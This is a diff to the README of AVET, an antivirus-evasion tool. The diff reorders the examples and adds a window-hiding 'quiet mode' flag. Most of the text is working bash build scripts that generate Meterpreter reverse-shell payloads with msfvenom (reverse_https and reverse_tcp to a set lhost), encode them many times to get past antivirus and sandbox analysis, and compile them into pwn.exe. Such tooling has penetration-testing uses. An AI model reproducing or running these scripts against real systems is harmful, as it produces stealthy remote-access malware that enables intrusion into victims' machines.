@@ -50,6 +50,8 @@ Let's have a look at the options from make_avet, examples will be given below:
 
 -p print debug information
 
+-q quiet mode (hide windows)
+
 -h help
 
 
@@ -64,6 +66,48 @@ Here are some explained examples for building the .exe files from the build dire
 
 
 Example 1
+---------
+In this example the evasion technique is simple. The shellcode is encoded with 20 rounds of 
+shikata-ga-nai, often enough that does the trick (note: Now it might be more ;) ). This technique is pretty similar to a junk loop. Execute so much code that the AV engine breaks up execution and let the file pass.
+
+```
+#!/bin/bash          
+# simple example script for building the .exe file
+# include script containing the compiler var $win32_compiler
+# you can edit the compiler in build/global_win32.sh
+# or enter $win32_compiler="mycompiler" here
+. build/global_win32.sh
+# make meterpreter reverse payload, encoded 20 rounds with shikata_ga_nai
+msfvenom -p windows/meterpreter/reverse_https lhost=192.168.116.128 lport=443 -e x86/shikata_ga_nai -i 20 -f c -a x86 --platform Windows > sc.txt
+# call make_avet, the sandbox escape is due to the many rounds of decoding the shellcode
+./make_avet -f sc.txt
+# compile to pwn.exe file
+$win32_compiler -o pwn.exe avet.c
+# cleanup
+echo "" > defs.h
+```
+
+Example 2, 64bit payloads
+-------------------------
+Great to notice that still for 64bit payload no further evasion techniques has to be used. But -F should work here too.
+
+```
+#!/bin/bash          
+# simple example script for building the .exe file
+. build/global_win64.sh
+# make meterpreter reverse payload
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.116.132 lport=443 -f c --platform Windows > sc.txt
+# format the shellcode for make_avet
+./format.sh sc.txt > scclean.txt && rm sc.txt
+# call make_avet, compile 
+./make_avet -f scclean.txt -X -E
+$win64_compiler -o pwn.exe avet.c
+# cleanup
+rm scclean.txt && echo "" > defs.h
+```
+
+
+Example 3
 ---------
 Compile shellcode into the .exe file and use -F as evasion technique. Note that this example will work for most antivirus engines. Here -E is used for encoding the shellcode as ASCII.
 
@@ -87,46 +131,6 @@ $win32_compiler -o pwn.exe avet.c
 rm scclean.txt && echo "" > defs.h
 ```
 
-Example 2
----------
-Usage without -E. The ASCII encoder does not have to be used, here is how to compile without -E. In this example the evasion technique is quit simple! The shellcode is encoded with 20 rounds of 
-shikata-ga-nai, often enough that does the trick. This technique is pretty similar to a junk loop. Execute so much code that the AV engine breaks up execution and let the file pass.
-
-```
-#!/bin/bash          
-# simple example script for building the .exe file
-# include script containing the compiler var $win32_compiler
-# you can edit the compiler in build/global_win32.sh
-# or enter $win32_compiler="mycompiler" here
-. build/global_win32.sh
-# make meterpreter reverse payload, encoded 20 rounds with shikata_ga_nai
-msfvenom -p windows/meterpreter/reverse_https lhost=192.168.116.128 lport=443 -e x86/shikata_ga_nai -i 20 -f c -a x86 --platform Windows > sc.txt
-# call make_avet, the sandbox escape is due to the many rounds of decoding the shellcode
-./make_avet -f sc.txt
-# compile to pwn.exe file
-$win32_compiler -o pwn.exe avet.c
-# cleanup
-echo "" > defs.h
-```
-
-Example 3, 64bit payloads
--------------------------
-Great to notice that still for 64bit payload no further evasion techniques has to be used. But -F should work here too.
-
-```
-#!/bin/bash          
-# simple example script for building the .exe file
-. build/global_win64.sh
-# make meterpreter reverse payload
-msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.116.132 lport=443 -f c --platform Windows > sc.txt
-# format the shellcode for make_avet
-./format.sh sc.txt > scclean.txt && rm sc.txt
-# call make_avet, compile 
-./make_avet -f scclean.txt -X -E
-$win64_compiler -o pwn.exe avet.c
-# cleanup
-rm scclean.txt && echo "" > defs.h
-```
 
 Example 4, load from a file
 ---------------------------
@@ -189,6 +193,12 @@ Example 7, use the "killswitch" sandbox evasion technique
 ---------------------------------------------------------
 This technique is using the gethostbyname command. See help from make_avet, for an example please refer:
 build/build_win32_meterpreter_rev_https_killswitch_shikata.sh
+
+
+Example 8, quite mode
+---------------------
+With the quite mode the cmd window is hidden. For an example see:
+build/build_win32_meterpreter_rev_https_fopen_shikata_quiet.sh
 
 
 avet_fabric.py
